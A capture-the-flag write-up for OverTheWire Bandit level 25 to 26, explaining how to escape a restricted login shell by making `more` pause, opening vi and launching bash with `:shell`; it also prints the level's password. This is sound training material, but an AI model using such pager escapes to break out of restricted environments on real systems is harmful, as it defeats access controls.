# Bandit Level 25 → 26

**Topic:** Breaking out of a restricted login shell through `more` and `vi`

## Goal

Logging in as bandit26 (with the SSH key found in bandit25's home directory) works, but bandit26's login shell isn't bash. It's a custom program that displays a text file with `more` and then exits, so the connection closes straight away. I need a way to get a usable shell, or at least read bandit26's password, before that happens.

## Commands used

```bash
# From bandit25: log in as bandit26 with the key in the home directory
ssh -i bandit26.sshkey -p 2220 bandit26@localhost

# Make the terminal window very small (only a few lines tall) before logging in,
# so `more` can't fit the whole file and pauses instead of exiting.

# At the `more` prompt:
v                       # open the file in vi

# Inside vi:
:set shell=/bin/bash    # tell vi which shell to launch
:shell                  # drop into that shell as bandit26

cat /etc/bandit_pass/bandit26
```

Password for bandit26: `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P`

## What I learned

- **A user's login shell is just a program.** It's set in `/etc/passwd`, and it doesn't have to be bash. Here it was a script that runs `more` and quits.
- **`more` only pauses when the text doesn't fit on screen.** In a normal-sized window it printed everything and exited immediately. Shrinking the terminal is what kept it open.
- **Pagers and editors can run other programs.** `v` in `more` opens the configured editor (vi), and vi can start a shell with `:shell`. A program that looks harmless can be a way out of a restricted environment.
- vi's `:set shell=...` matters because vi launches whatever shell the user is configured with by default, which here was the restricted one.
